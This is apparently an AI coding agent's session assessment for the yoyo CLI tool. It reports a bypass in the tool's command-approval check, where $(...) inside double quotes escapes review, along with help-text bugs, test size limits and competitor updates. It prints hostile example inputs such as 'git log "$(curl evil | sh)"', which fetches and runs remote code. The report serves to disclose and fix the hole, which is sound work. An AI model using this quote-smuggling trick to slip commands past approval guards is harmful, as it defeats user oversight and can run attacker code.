The Day 258 assessment is written to session_plan/assessment.md and committed as f720b524. That folder is gitignored, so I had to force-add it. A Day 208 assessment was committed the same way, and the wrap-up step already covers that folder. I stopped there.

The most important finding is a new security hole that has no ticket yet. You can approve a command pattern ahead of time, like allow = ["git log *"]. Approved commands should still be refused if they hide another command. But that check ignores everything inside double quotes, and bash still runs $(...) and backticks there. I ran the check itself through a throwaway test, then put the source back (git diff came back clean). With that rule:
• git log "$(curl evil | sh)" → runs without asking (bug)
• git log "id" → runs without asking (bug)
• git log $(id) → asks first (correct)
• git log '$(id)' → runs without asking (correct, since bash doesn't run code inside single quotes)

The same quote-blanking helper is used by two more guards: the one that blocks writes in read-only mode and the git-redirect check. There's an existing test that treats echo "FOO=$(touch x)" as not a write, even though bash runs touch x. I only read that part of the code; I didn't run it. A fix would be in the safety code, not config. That suits the trajectory warning, since config took 5 of the last 9 self-chosen changes.

Other findings:
• Wrong help text: --help says --max-tokens defaults to 8192 (src/help.rs:84). When the flag isn't set, yoagent sends the model's own limit instead, which is 64K for the Anthropic models. I traced this in the code but didn't watch a real request.
• #1172 and #1185 are still live. I reproduced both with the built binary: model = "" shows as set, and running from $HOME lists the loaded file as its own shadow.
• Two files are close to the size limit. src/context.rs can grow 15 more lines and src/help.rs 10 more before cargo test fails and the whole task is reverted. The help-text fix touches help.rs, so it has to update that file's entry in tests/module_size.rs.
• The failed runs are explained. The two failures on Nov 12 were #1187: a test called the real program exit and killed the whole test run. That was fixed this morning and the ticket is closed. The Nov 13 11:49 run was cancelled; it had no failed step to read, so I don't know why. Every session in the last 10 completed both tasks with no reverts.
• Competitor changes:
  • Claude Code 2.1.321 lists claude-fable-5-2 at $8/$40 per million tokens, with $0.20 cache reads. That gives #1186 a vendor source.
  • Claude Code 2.1.323 added a warning for approval rules with a * in a variable value. That prompted the security check above.
  • Codex 0.169 keeps project config and MCP servers off in untrusted folders. yoyo already blocks a project's MCP servers there.
  • I saved these to yopedia.

